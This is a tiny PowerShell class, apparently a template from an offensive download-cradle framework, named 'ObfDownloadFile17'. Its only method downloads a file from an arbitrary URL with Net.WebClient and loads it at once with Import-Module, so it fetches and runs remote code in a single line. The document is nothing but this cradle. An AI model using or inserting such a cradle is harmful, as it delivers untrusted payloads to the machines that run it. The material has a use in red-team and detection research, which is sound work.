Class ObfDownloadFile17 {

    static Execute ([String]$url, [String]$path) {
        #CLI:  Disk\PsWebFile\Invoke\12
        (New-Object Net.WebClient).DownloadFile($url,$path);Import-Module $path
    }

}